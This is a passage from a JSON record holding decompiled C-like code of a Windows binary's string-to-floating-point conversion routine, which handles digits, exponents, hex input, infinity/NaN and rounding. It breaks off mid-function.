        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0041ef70(uint8_t *param_1, uint8_t **param_2, uint32_t *param_3, uint32_t *param_4, uint *param_5)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    double dVar3;\n    bool bVar4;\n    uint8_t **ppuVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint *puVar17;\n    uint32_t uVar19;\n    uint8_t uVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    uint32_t *puVar23;\n    int32_t *piVar24;\n    int32_t *piVar25;\n    uint32_t uVar26;\n    int32_t iVar27;\n    uint8_t *puVar28;\n    uint32_t uVar29;\n    int32_t iVar30;\n    uint32_t uVar31;\n    float10 fVar32;\n    bool bVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    uint32_t uStack204;\n    uint8_t *puStack188;\n    uint32_t uStack184;\n    uint32_t uStack180;\n    double dStack172;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    double dStack148;\n    int32_t iStack140;\n    uint32_t uStack128;\n    uint32_t uStack116;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    int32_t iStack64;\n    uchar auStack60 [4];\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint8_t *puStack44;\n    int32_t iStack40;\n    ulong uStack36;\n    uint *puVar18;\n    \n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    puVar28 = *ppuVar5;\n    uVar6 = sub.msvcrt.dll_strlen(puVar28);\n    uStack56 = 0;\n    iStack40 = 0;\n    uStack36 = 0.0;\n    uVar34 = *param_3;\n    puStack44 = param_1;\n    uVar20 = *param_1;\n    if (uVar20 < 0x2e) {\ncode_r0x0041efd3:\n    // switch table (46 cases) at 0x505e4c\n        switch(*(uVar20 * 4 + 0x505e4c)) {\n        case 0x41efe0:\n            goto code_r0x0041efe0;\n        case 0x41f020:\n            iStack140 = 0;\n            break;\n        case 0x41f0d0:\n            goto code_r0x0041f0d0;\n        case 0x41f0f0:\n            goto code_r0x0041f0f0;\n        case 0x41f160:\n            iStack140 = 1;\n        }\n        uVar20 = puStack44[1];\n        puStack44 = puStack44 + 1;\n        if (uVar20 == 0) {\ncode_r0x0041efe0:\n            if (param_2 == NULL) {\n                return 6;\n            }\n            *param_2 = param_1;\n            return 6;\n        }\n        goto joined_r0x0041f049;\n    }\ncode_r0x0041f0f0:\n    iStack140 = 0;\njoined_r0x0041f049:\n    uStack180 = 0;\n    if (uVar20 != 0x30) {\ncode_r0x0041f04f:\n        puStack188 = puStack44;\n        uVar19 = uVar20;\n        uVar16 = param_3[4];\n        if (uVar19 - 0x30 < 10) {\n            uStack204 = 0;\n            uStack164 = 0;\n            uVar26 = 0;\n            do {\n                puStack44 = puStack44 + 1;\n                if (uVar26 < 9) {\n                    uStack164 = (uVar19 - 0x30) + uStack164 * 10;\n                }\n                else if (uVar26 < 0x10) {\n                    uStack204 = (uVar19 - 0x30) + uStack204 * 10;\n                }\n                uVar20 = *puStack44;\n                uVar19 = uVar20;\n                uVar26 = uVar26 + 1;\n            } while (uVar19 - 0x30 < 10);\n        }\n        else {\n            uStack204 = 0;\n            uStack164 = 0;\n            uVar26 = 0;\n        }\n        uVar29 = uVar26;\n        if (*puVar28 == uVar20) {\n            if (puVar28[1] != 0) {\n                if (puVar28[1] == puStack44[1]) {\n                    puVar28 = puVar28 + 2;\n                    puVar8 = puStack44 + 2;\n                    do {\n                        uVar20 = *puVar28;\n                        if (uVar20 == 0) goto code_r0x0041f629;\n                        puVar28 = puVar28 + 1;\n                        uVar2 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                    } while (uVar2 == uVar20);\n                }\n                goto code_r0x0041f180;\n            }\n            puVar8 = puStack44 + 1;\ncode_r0x0041f629:\n            uVar19 = *puVar8;\n            puStack44 = puVar8;\n            if (uVar26 == 0) {\n                if (uVar19 == 0x30) {\n                    do {\n                        puStack44 = puStack44 + 1;\n                        uVar19 = *puStack44;\n                        uVar31 = puStack44 - puVar8;\n                    } while (uVar19 == 0x30);\n                }\n                else {\n                    uVar31 = 0;\n                }\n                if (uVar19 - 0x31 < 9) {\n                    uStack160 = uVar19 - 0x30;\n                    dStack172._0_4_ = uVar31 + 1;\n                    uVar29 = 1;\n                    puStack188 = puStack44;\n                    goto code_r0x00420920;\n                }\n                dStack172._0_4_ = 0;\n                uVar29 = 0;\n            }\n            else {\n                dStack172._0_4_ = 0;\n                uVar31 = 0;\n                while (uStack160 = uVar19 - 0x30,  uStack160 < 10) {\n                    uVar15 = uVar31 + 1;\n                    if (uStack160 != 0) {\n                        dStack172._0_4_ = dStack172._0_4_ + uVar15;\n                        uVar19 = uVar29;\n                        if (uVar15 != 1) {\n                            uVar19 = uVar31 + uVar29;\n                            do {\n                                if (uVar29 < 9) {\n                                    uStack164 = uStack164 * 10;\n                                }\n                                else if (uVar29 + 1 < 0x11) {\n                                    uStack204 = uStack204 * 10;\n                                }\n                                uVar29 = uVar29 + 1;\n                            } while (uVar19 != uVar29);\n                        }\n                        uVar29 = uVar19 + 1;\n                        if (uVar19 < 9) {\ncode_r0x00420920:\n                            uStack164 = uStack160 + uStack164 * 10;\n                            uVar15 = 0;\n                        }\n                        else {\n                            uVar15 = 0;\n                            if (uVar29 < 0x11) {\n                                uStack204 = uStack160 + uStack204 * 10;\n                            }\n                        }\n                    }\n                    uVar19 = puStack44[1];\n                    uVar31 = uVar15;\n                    puStack44 = puStack44 + 1;\n                }\n            }\n            bVar33 = true;\n        }\n        else {\ncode_r0x0041f180:\n            uVar31 = 0;\n            dStack172._0_4_ = 0;\n            bVar33 = false;\n        }\n        puVar28 = puStack44;\n        if ((uVar19 & 0xffffffdf) == 0x45) {\n            if ((uVar29 | uVar31 | uStack180) != 0) {\n                param_1 = puStack44;\n                uVar20 = puStack44[1];\n                if (uVar20 == 0x2b) {\n                    bVar4 = false;\ncode_r0x0041f9d8:\n                    uVar20 = puStack44[2];\n                    puStack44 = puStack44 + 2;\n                }\n                else {\n                    if (uVar20 == 0x2d) {\n                        bVar4 = true;\n                        goto code_r0x0041f9d8;\n                    }\n                    bVar4 = false;\n                    puStack44 = puStack44 + 1;\n                }\n                uVar19 = uVar20;\n                puVar8 = puStack44;\n                if (uVar19 - 0x30 < 10) {\n                    while (uVar19 == 0x30) {\n                        uVar19 = puVar8[1];\n                        puVar8 = puVar8 + 1;\n                    }\n                    iVar7 = 0;\n                    puStack44 = puVar8;\n                    if (uVar19 - 0x31 < 9) {\n                        iVar7 = uVar19 - 0x30;\n                        puStack44 = puVar8 + 1;\n                        uVar19 = puVar8[1];\n                        if (uVar19 - 0x30 < 10) {\n                            puVar28 = puVar8 + 2;\n                            do {\n                                puStack44 = puVar28;\n                                iVar7 = (uVar19 - 0x30) + iVar7 * 10;\n                                uVar19 = *puStack44;\n                                puVar28 = puStack44 + 1;\n                            } while (uVar19 - 0x30 < 10);\n                        }\n                        if ((8 < puStack44 - puVar8) || (19999 < iVar7)) {\n                            iVar7 = 19999;\n                        }\n                        if (bVar4) {\n                            iVar7 = -iVar7;\n                        }\n                    }\n                }\n                else {\n                    iVar7 = 0;\n                    puStack44 = puVar28;\n                }\n                goto code_r0x0041f19e;\n            }\n            goto code_r0x0041f3b1;\n        }\n        iVar7 = 0;\n        puStack44 = puVar28;\ncode_r0x0041f19e:\n        if (uVar29 == 0) {\n            if ((uStack180 | uVar31) != 0) goto code_r0x0041f3d1;\n            if (!bVar33) {\n                if (uVar19 == 0x4e) {\ncode_r0x0041f1d7:\n                    iVar7 = fcn.00427620(&puStack44, 0x505e49);\n                    if (iVar7 != 0) {\n                        uStack56 = 4;\n                        *param_4 = param_3[2] + 1;\n                        if (*puStack44 != 0x28) goto code_r0x0041f3d1;\n                        uStack56 = fcn.00426500(&puStack44, param_3, param_5);\ncode_r0x0041f257:\n                        *param_4 = param_3[2] + 1;\n                        goto code_r0x0041f3d1;\n                    }\n                }\n                else if (uVar19 < 0x4f) {\n                    if (uVar19 == 0x49) goto code_r0x00420650;\n                }\n                else if (uVar19 == 0x69) {\ncode_r0x00420650:\n                    iVar7 = fcn.00427620(&puStack44, 0x505e40);\n                    if (iVar7 != 0) {\n                        puStack44 = puStack44 + -1;\n                        iVar7 = fcn.00427620(&puStack44, \"inity\");\n                        if (iVar7 == 0) {\n                            puStack44 = puStack44 + 1;\n                        }\n                        uStack56 = 3;\n                        goto code_r0x0041f257;\n                    }\n                }\n                else if (uVar19 == 0x6e) goto code_r0x0041f1d7;\n            }\ncode_r0x0041f3b1:\n            uStack56 = 6;\n            puStack44 = param_1;\n            goto code_r0x0041f3d1;\n        }\n        iVar7 = iVar7 - dStack172._0_4_;\n        uStack56 = 1;\n        uVar19 = param_3[3] & 3;\n        uStack128 = uVar19 - iStack140;\n        if ((uVar19 != 2) && (uStack128 = iStack140 + 1,  uVar19 != 3)) {\n            uStack128 = uVar19 == 0;\n        }\n        if (uVar26 == 0) {\n            uVar26 = uVar29;\n        }\n        uVar19 = 0x10;\n        if (uVar29 < 0x11) {\n            uVar19 = uVar29;\n        }\n        uStack36 = uStack164;\n        if (9 < uVar29) {\n            uStack36 = uStack204 + uStack36 * *(uVar19 * 8 + 0x506198);\n        }\n        iVar21 = iVar7;\n        if ((0x35 < uVar34) || (0xf < uVar29)) goto code_r0x0041f694;\n        if (iVar7 == 0) {\n            bVar33 = true;\ncode_r0x0041f5b6:\n            iVar21 = fcn.0041ead0(param_5, bVar33, uStack128, &uStack56);\n            if (iVar21 != 0) goto code_r0x0041f3d1;\n            iVar21 = 0;\n        }\n        else if (iVar7 < 1) {\n            if (-0x17 < iVar7) {\n                uStack36 = uStack36 / *(iVar7 * -8 + 0x5061e0);\ncode_r0x004205f4:\n                bVar33 = false;\n                goto code_r0x0041f5b6;\n            }\n        }\n        else {\n            if (iVar7 < 0x17) {\n                if (uStack36 == 0) {\n                    iVar21 = 0;\n                    for (uStack36._4_4_ = uStack36._4_4_ | 0x100000; (uStack36._4_4_ & 1) == 0;\n                        uStack36._4_4_ = uStack36._4_4_ >> 1 | 0x80000000) {\n                        iVar21 = iVar21 + 1;\n                    }\n                    iVar21 = 0x15 - iVar21;\n                }\n                else {\n                    iVar21 = 0;\n                    for (; (uStack36 & 1) == 0; uStack36._0_4_ = uStack36 >> 1 | 0x80000000) {\n                        iVar21 = iVar21 + 1;\n                    }\n                    iVar21 = 0x35 - iVar21;\n                }\n                bVar33 = *(iVar7 * 4 + 0x505f20) + iVar21 < 0x36;\n                uStack36 = uStack36 * *(iVar7 * 8 + 0x5061e0);\n                goto code_r0x0041f5b6;\n            }\n            if (iVar7 <= 0x25 - uVar29) {\n                uStack36 = uStack36 * *((0xf - uVar29) * 8 + 0x5061e0) * *((iVar7 - (0xf - uVar29)) * 8 + 0x5061e0);\n                goto code_r0x004205f4;\n            }\n        }\ncode_r0x0041f694:\n        uVar19 = (uVar29 - uVar19) + iVar21;\n        if (uVar19 < 1) {\n            uVar31 = uVar19;\n            if (uVar19 != 0) {\n                uVar19 = -uVar19;\n                if ((uVar19 & 0xf) != 0) {\n                    uStack36 = uStack36 / *((uVar19 & 0xf) * 8 + 0x5061e0);\n                }\n                uVar31 = uVar19 & 0xfffffff0;\n                if (uVar31 != 0) {\n                    uVar19 = uVar19 >> 4;\n                    if (uVar19 < 0x10) {\n                        iVar21 = 0;\n                    }\n                    else {\n                        uVar31 = uVar19 - 0x10;\n                        iVar21 = 0;\n                        do {\n                            uVar19 = uVar19 - 0x10;\n                            uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                            iVar21 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                            uStack36 = uStack36 * *0x5062c0;\n                        } while ((uVar31 & 0xf) != uVar19);\n                        uVar19 = uVar31 & 0xf;\n                    }\n                    uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                    uVar31 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                    if (0 < uVar19) {\n                        bVar33 = false;\n                        iVar21 = 0;\n                        dVar3 = uStack36;\n                        do {\n                            if ((uVar19 & 1) != 0) {\n                                dVar3 = dVar3 * *(iVar21 * 8 + 0x5062a0);\n                                bVar33 = true;\n                            }\n                            iVar21 = iVar21 + 1;\n                            uVar19 = uVar19 >> 1;\n                        } while (uVar19 != 0);\n                        goto code_r0x0041f967;\n                    }\n                }\n            }\n        }\n        else {\n            if ((uVar19 & 0xf) != 0) {\n                uStack36 = uStack36 * *((uVar19 & 0xf) * 8 + 0x5061e0);\n            }\n            uVar31 = uVar19 & 0xfffffff0;\n            if ((uVar19 & 0xfffffff0) != 0) {\n                uVar19 = uVar19 >> 4;\n                if (uVar19 < 0x10) {\n                    iVar21 = 0;\n                }\n                else {\n                    uVar31 = uVar19 - 0x10;\n                    iVar21 = 0;\n                    do {\n                        uVar19 = uVar19 - 0x10;\n                        uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                        iVar21 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                        uStack36 = uStack36 * *0x506300;\n                    } while ((uVar31 & 0xf) != uVar19);\n                    uVar19 = uVar31 & 0xf;\n                }\n                uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                uVar31 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                if (uVar19 != 0) {\n                    bVar33 = false;\n                    iVar21 = 0;\n                    dVar3 = uStack36;\n                    do {\n                        if ((uVar19 & 1) != 0) {\n                            dVar3 = dVar3 * *(iVar21 * 8 + 0x5062e0);\n                            bVar33 = true;\n                        }\n                        iVar21 = iVar21 + 1;\n                        uVar19 = uVar19 >> 1;\n                    } while (uVar19 != 0);\ncode_r0x0041f967:\n                    if (bVar33) {\n                        uStack36 = dVar3;\n                    }\n                }\n            }\n        }\n        iStack40 = fcn.00427350(uStack36, &uStack48, &uStack52);\n        uStack48 = uVar31 + uStack48;\n        iVar21 = uStack52 - uVar34;\n        if (0 < iVar21) {\n            fcn.00426330(iStack40, iVar21);\n            uStack48 = iVar21 + uStack48;\n            uStack52 = uVar34;\n        }\n        uStack100 = (uStack52 + uStack48) - uVar34;\n        uStack116 = uVar16;\n        if (param_3[2] + 1 < uStack100) {\n            uStack180 = 0;\n            goto code_r0x0041fb68;\n        }\n        uVar19 = param_3[1];\n        if (uVar19 <= uStack100) {\n            uStack180 = 0;\n            goto code_r0x0041fc03;\n        }\n        iVar21 = uStack48 - uVar19;\n        if (iVar21 < 1) {\n            if (iVar21 == 0) goto code_r0x0041f78e;\n            uStack52 = uStack52 + iVar21;\n            if (0 < uStack52) {\n                fcn.00426330(iStack40, -iVar21);\n                goto code_r0x0041f78e;\n            }\n            if (-2 < uStack52) {\n                uStack52 = 1;\n                *(iStack40 + 0x10) = 1;\n                *(iStack40 + 0x14) = 1;\n                goto code_r0x0041f78e;\n            }\n            *(iStack40 + 0x10) = 0;\n            *(iStack40 + 0x14) = 0;\n            *param_4 = uVar19;\n            if (uVar16 != 0) goto code_r0x0041f7d5;\n            uStack56 = 0x50;\n            goto code_r0x0041f460;\n        }\n        iStack40 = fcn.00426f00(iStack40, iVar21);\n        uStack52 = uStack52 + iVar21;\ncode_r0x0041f78e:\n        if ((uVar16 == 0) || (uVar19 <= uStack100 + 1)) {\n            uStack180 = 1;\n            uStack100 = uVar19;\n            uStack48 = uVar19;\ncode_r0x0041fc03:\n            iVar10 = fcn.00427480(puStack188, uVar26, uVar29, uStack164, uVar6);\n            uStack184 = 0;\n            iVar21 = -iVar7;\n            iVar11 = 0;\n            if (-1 < iVar7) {\n                iVar21 = 0;\n                iVar11 = iVar7;\n            }\n            do {\n                puStack188 = fcn.004269b0(*(iVar10 + 4), uVar26);\n                iVar12 = iVar10 + 0xc;\n                sub.msvcrt.dll_memcpy(puStack188 + 0xc, iVar10 + 0xc, *(iVar10 + 0x10) * 4 + 8);\n                iVar12 = fcn.004269b0(*(iStack40 + 4), iVar12);\n                iVar13 = iStack40 + 0xc;\n                sub.msvcrt.dll_memcpy(iVar12 + 0xc, iVar13, *(iStack40 + 0x10) * 4 + 8);\n                uVar29 = uStack52 - uStack184;\n                iVar14 = uStack184 + uStack48;\n                uStack204 = fcn.00426be0(1, iVar13);\n                if (iVar14 < 0) {\n                    iVar13 = iVar11 - iVar14;\n                    iVar30 = iVar21;\n                }\n                else {\n                    iVar13 = iVar11;\n                    iVar30 = iVar21 + iVar14;\n                }\n                iVar27 = (iVar14 + uVar29) - uVar34;\n                iVar14 = (uVar34 + 1) - uVar29;\n                if (iVar27 < uVar19) {\n                    iVar14 = (iVar27 - uVar19) + iVar14;\n                }\n                iVar27 = iVar30 + iVar14;\n                iVar13 = iVar13 + iVar14;\n                iVar14 = iVar13;\n                if (iVar27 <= iVar13) {\n                    iVar14 = iVar27;\n                }\n                if (iVar30 <= iVar14) {\n                    iVar14 = iVar30;\n                }\n                if (0 < iVar14) {\n                    iVar27 = iVar27 - iVar14;\n                    iVar13 = iVar13 - iVar14;\n                    iVar30 = iVar30 - iVar14;\n                }\n                iVar14 = iVar12;\n                if (iVar21 != 0) {\n                    uStack204 = fcn.00426d80(uStack204, iVar21);\n                    iVar35 = iVar12;\n                    iVar14 = fcn.00426c10(uStack204, iVar12);\n                    fcn.00426a80(iVar12, iVar35);\n                }\n                iVar27 = iVar27 - uStack184;\n                if (iVar27 < 1) {\n                    if (iVar27 != 0) {\n                        fcn.00426330(iVar14, -iVar27);\n                    }\n                }\n                else {\n                    iVar14 = fcn.00426f00(iVar14, iVar27);\n                }\n                if (0 < iVar7) {\n                    puStack188 = fcn.00426d80(puStack188, iVar11);\n                }\n                if (0 < iVar13) {\n                    puStack188 = fcn.00426f00(puStack188, iVar13);\n                }\n                if (0 < iVar30) {\n                    uStack204 = fcn.00426f00(uStack204, iVar30);\n                }\n                uVar26 = puStack188;\n                iVar12 = fcn.00427070(iVar14, puStack188);\n                if ((*(iVar12 + 0x10) < 2) && (*(iVar12 + 0x14) == 0)) goto code_r0x00420234;\n                uVar31 = *(iVar12 + 0xc);\n                *(iVar12 + 0xc) = 0;\n                uVar26 = uStack204;\n                iVar13 = fcn.00427020(iVar12, uStack204);\n                if ((uStack128 == 0) || (0 < iVar13)) {\n                    if (iVar13 < 0) {\n                        if (uVar31 != 0) goto code_r0x00420a28;\n                        uStack56 = 0x21;\n                        if (((1 < uVar29) || (uStack100 == uVar19)) || (uStack180 != 0)) goto code_r0x00420234;\n                        iVar12 = fcn.00426f00(iVar12, 1);\n                        uVar26 = uStack204;\n                        iVar7 = fcn.00427020(iVar12, uStack204);\n                        if (iVar7 < 1) goto code_r0x00420550;\n                        uStack56 = 0x11;\n                        uStack180 = 0;\n                    }\n                    else {\n                        if (iVar13 != 0) {\n                            uVar26 = uStack204;\n                            fVar32 = fcn.00427560(iVar12, uStack204);\n                            if (fVar32 <= *0x505f80) {\n                                if (uVar31 == 0) {\n                                    uStack184 = 0;\n                                    goto code_r0x004200be;\n                                }\n                                iStack156 = 0;\n                                uStack104 = 0x20;\n                                uStack184 = 0;\n                                uStack160 = 0;\n                                dStack172 = 1.0;\n                                dStack148 = 1.0;\n                                goto code_r0x0041ff9b;\n                            }\n                            uStack104 = (-(uVar31 == 0) & 0x10) + 0x10;\n                            fVar32 = fVar32 * *0x505f84;\n                            uStack160 = uVar31 == 0;\n                            dStack172 = fVar32;\n                            if (*0x505f88 <= fVar32) {\n                                iStack156 = 0;\n                                dStack148 = dStack172;\n                            }\n                            else {\n                                iStack156 = ROUND(fVar32);\n                                dStack172 = iStack156;\n                                dStack148 = fVar32 - iStack156;\n                                if (uStack128 == 1) {\n                                    if (uStack160 != 0) {\ncode_r0x004203e5:\n                                        if (0.0 < dStack148) {\ncode_r0x004203f1:\n                                            iStack156 = iStack156 + 1;\n                                            uStack104 = 0x30 - uStack104;\n                                            dStack172 = iStack156;\n                                        }\n                                    }\n                                }\n                                else if (uStack128 == 2) {\n                                    if (uStack160 == 0) goto code_r0x004203e5;\n                                }\n                                else if (*0x505f84 <= fVar32 - iStack156) goto code_r0x004203f1;\n                            }\n                            uStack184 = 0;\n                            goto code_r0x0041ff9b;\n                        }\n                        if (uVar31 != 0) {\n                            if (uStack180 == 0) goto code_r0x00420a38;\n                            puVar23 = iStack40 + 0x14;\n                            puVar1 = puVar23 + (uStack52 >> 5);\n                            if (puVar1 <= puVar23) goto code_r0x00420801;\n                            uVar16 = *(iStack40 + 0x14);\n                            puVar23 = iStack40 + 0x18;\n                            goto joined_r0x004207e1;\n                        }\n                        if (uVar29 != 1) {\n                            uStack56 = 0x21;\n                            goto code_r0x004209cb;\n                        }\n                        uStack56 = 1;\n                        if (uStack100 == uVar19) {\n                            uStack56 = 0x21;\n                            if ((*(iStack40 + 0x10) == 1) && (uStack116 = uVar29,  *(iStack40 + 0x14) != 1)) {\n                                uStack116 = uVar16;\n                            }\n                            goto code_r0x00420234;\n                        }\n                    }\n                    uStack48 = uStack48 - uVar34;\n                    uStack52 = uVar34;\n                    uVar26 = uVar34;\n                    iStack40 = fcn.0041eef0(iStack40, uVar34);\n                    goto code_r0x00420234;\n                }\n                uVar15 = uStack128 & 1;\n                uStack184 = uVar15 ^ uVar31;\n                if (uVar15 == uVar31) {\n                    uStack56 = (-(uVar15 == 0) & 0x10) + 0x11;\n                    goto code_r0x00420234;\n                }\n                if (uVar31 == 0) {\n                    uStack56 = 0x11;\n                    if (uStack100 != uVar19) {\n                        uVar15 = uVar34;\n                        if (uVar34 < 0x20) {\ncode_r0x004201e5:\n                            if (1 < uVar15) {\n                                puVar23 = iStack40 + 0x14 + uVar31 * 4;\n                                iVar13 = 0;\n                                uVar31 = *puVar23;\n                                for (uVar22 = uVar31; (uVar22 & 1) == 0; uVar22 = uVar22 >> 1 | 0x80000000) {\n                                    iVar13 = iVar13 + 1;\n                                }\n                                *puVar23 = uVar31 >> (iVar13 & 0x1f);\n                                if (iVar13 < uVar15 - 1) goto code_r0x004200be;\n                            }\n                            uStack48 = uStack100 - 1;\n                            uStack52 = uVar34;\n                            uVar26 = uVar34;\n                            iStack40 = fcn.0041eef0(iStack40, uVar34);\n                            goto code_r0x00420234;\n                        }\n                        iVar13 = *(iStack40 + 0x14);\n                        uVar22 = uVar34;\n                        while (iVar13 == 0) {\n                            uVar22 = uVar22 - 0x20;\n                            uVar31 = uVar31 + 1;\n                            uVar15 = uVar34 & 0x1f;\n                            if ((uVar34 & 0x1f) == uVar22) goto code_r0x004201e5;\n                            iVar13 = *(iStack40 + 0x14 + uVar31 * 4);\n                        }\n                    }\ncode_r0x004200be:\n                    if ((uVar29 < 2) && (uStack180 != 0)) {\n                        uStack180 = 1;\n                        goto code_r0x00420951;\n                    }\n                    iStack156 = 0;\n                    uStack104 = 0x10;\n                    uStack160 = 1;\n                    dStack172 = 1.0;\n                    dStack148 = 1.0;\n                }\n                else {\n                    uStack56 = 0x21;\n                    iStack156 = 0;\n                    uStack104 = 0x20;\n                    uStack160 = 0;\n                    dStack172 = 1.0;\n                    dStack148 = 1.0;\n                }\ncode_r0x0041ff9b:\n                iVar13 = uStack48 + uStack52;\n                if ((uStack52 < uVar34) && (uStack180 == 0)) {\n                    iVar30 = uVar34 - uStack52;\n                    iStack40 = fcn.00426f00(iStack40, iVar30);\n                    uStack48 = uStack48 - iVar30;\n                    uStack52 = uVar34;\n                }\n                uVar26 = fcn.00427350(dStack172, &iStack64, auStack60);\n                if (iStack64 < 0) {\n                    fcn.00426330();\n                }\n                else if (iStack64 != 0) {\n                    uVar26 = fcn.00426f00();\n                }\n                iVar30 = iStack40;\n                if (uStack160 == 0) {\n                    iStack40 = fcn.00420af0();\n                    iVar27 = *(iStack40 + 0x10) + -1;\n                    if (*(iVar30 + 0x10) != iVar27 && iVar27 <= *(iVar30 + 0x10)) {\n                        iVar27 = *(iStack40 + 0x10) + 3;\n                        puVar23 = iStack40 + 4 + iVar27 * 4;\n                        uVar29 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar29 == 0; uVar29 = uVar29 - 1) {\n                            }\n                        }\n                        puVar23 = iVar30 + 4 + iVar27 * 4;\n                        uVar31 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar31 == 0; uVar31 = uVar31 - 1) {\n                            }\n                        }\n                        if ((uVar31 ^ 0x1f) <= (uVar29 ^ 0x1f)) goto code_r0x0041fcd0;\n                    }\n                    if (uStack180 == 0) {\n                        uVar26 = 1;\n                        fcn.00426330();\n                        uStack48 = uStack48 + 1;\n                        uStack100 = uStack100 + 1;\n                        iStack156 = 0;\n                    }\n                    else {\n                        uStack52 = uStack52 + 1;\n                        uStack180 = uStack52 != uVar34;\n                    }\ncode_r0x0041fcd0:\n                    fcn.00426a80();\n                    fcn.00426a80();\n                    if (uStack184 != 0) goto code_r0x00420234;\n                    if ((uStack52 + uStack48 == iVar13) && (iStack156 != 0)) {\n                        dStack172 = dStack172 * *0x505f90;\n                        if (-dStack172 <= dStack148 - *0x505f84) {\n                            if ((dStack172 < dStack148 - *0x505f84) && (dStack148 < *0x505f7c - dStack172))\n                            goto code_r0x00420440;\n                        }\n                        else if (dStack172 < dStack148) goto code_r0x00420440;\n                    }\n                    if (uStack180 == 0) goto code_r0x00420159;\n                }\n                else {\n                    iStack40 = fcn.00427070();\n                    if (uStack180 != 0) goto code_r0x0041fcd0;\n                    iVar27 = *(iVar30 + 0x10) + -1;\n                    if (*(iStack40 + 0x10) != iVar27 && iVar27 <= *(iStack40 + 0x10)) {\n                        iVar27 = *(iVar30 + 0x10) + 3;\n                        puVar23 = iStack40 + 4 + iVar27 * 4;\n                        uVar29 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar29 == 0; uVar29 = uVar29 - 1) {\n                            }\n                        }\n                        puVar23 = iVar30 + 4 + iVar27 * 4;\n                        uVar31 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar31 == 0; uVar31 = uVar31 - 1) {\n                            }\n                        }\n                        if ((uVar29 ^ 0x1f) <= (uVar31 ^ 0x1f)) goto code_r0x0041fcd0;\n                    }\n                    if (uStack100 == uVar19) {\n                        uStack52 = uStack52 - 1;\n                        uStack180 = uStack160;\n                        goto code_r0x0041fcd0;\n                    }\n                    uVar26 = 1;\n                    iStack40 = fcn.00426f00();\n                    uStack48 = uStack48 - 1;\n                    uStack100 = uStack100 - 1;\n                    fcn.00426a80();\n                    fcn.00426a80();\ncode_r0x00420159:\n                    uStack184 = fcn.00426440();\n                    uStack180 = 0;\n                }\n                fcn.00426a80();\n                fcn.00426a80();\n                fcn.00426a80();\n                fcn.00426a80();\n            } while( true );\n        }\n        *(iStack40 + 0x10) = 0;\n        *(iStack40 + 0x14) = 0;\n        *param_4 = uVar19;\n        uStack48 = uVar19;\n        goto code_r0x0041f7d5;\n    }\n    if ((puStack44[1] == 0x58) || (puStack44[1] == 0x78)) {\n        uStack56 = fcn.00425920(&puStack44, param_3, param_4, &iStack40, iStack140);\n        if (uStack56 == 6) {\n            puStack44 = param_1;\n            if (param_2 != NULL) {\n                *param_2 = param_1;\n            }\n            goto code_r0x0041f3fc;\n        }\n    }\n    else {\n        do {\n            puStack44 = puStack44 + 1;\n            uVar20 = *puStack44;\n        } while (uVar20 == 0x30);\n        if (uVar20 != 0) {\n            uStack180 = 1;\n            goto code_r0x0041f04f;\n        }\n    }\n    goto code_r0x0041f3d1;\ncode_r0x0041f0d0:\n    puStack44 = puStack44 + 1;\n    uVar20 = *puStack44;\n    if (0x2d < uVar20) goto code_r0x0041f0f0;\n    goto code_r0x0041efd3;\njoined_r0x004207e1:\n    if (uVar16 != 0xffffffff) goto code_r0x00420a38;\n    if (puVar1 <= puVar23) goto code_r0x00420801;\n    uVar16 = *puVar23;\n    puVar23 = puVar23 + 1;\n    goto joined_r0x004207e1;\ncode_r0x00420440:\n    uStack56 = uStack56 | uStack104;\ncode_r0x00420234:\n    if (uStack180 == 0) {\ncode_r0x00420550:\n        uStack180 = uStack52;\n        goto code_r0x0042055b;\n    }\n    goto code_r0x00420247;\ncode_r0x00420801:\n    if (((uStack52 & 0x1f) != 0) && ((-1 << (uStack52 & 0x1f) | *puVar23) != 0xffffffff)) {\ncode_r0x00420a38:\n        uStack56 = 0x11;\ncode_r0x004209cb:\n        if ((uVar34 <= uVar29) || (uStack180 != 0)) {\n            if ((*(iStack40 + 0x14) & 1) != 0) {\n                if (uVar31 == 0) {\n                    if (uVar29 == 1) {\ncode_r0x00420951:\n                        *(iStack40 + 0x10) = 0;\n                        uStack56 = 0x50;\n                        uStack48 = uVar19;\n                    }\n                    else {\n                        iVar7 = *(iStack40 + 0x10);\n                        piVar25 = iStack40 + 0x14;\n                        do {\n                            if (*piVar25 != 0) {\n                                *piVar25 = *piVar25 + -1;\n                                break;\n                            }\n                            piVar24 = piVar25 + 1;\n                            *piVar25 = -1;\n                            piVar25 = piVar24;\n                        } while (piVar24 < iStack40 + 0x14 + iVar7);\ncode_r0x00420a28:\n                        uStack56 = 0x11;\n                    }\n                }\n                else {\n                    iStack40 = fcn.0041ea30(iStack40, uVar26);\n                    puVar23 = iStack40 + 0x10 + *(iStack40 + 0x10) * 4;\n                    uVar16 = 0x1f;\n                    if (*puVar23 != 0) {\n                        for (; *puVar23 >> uVar16 == 0; uVar16 = uVar16 - 1) {\n                        }\n                    }\n                    if 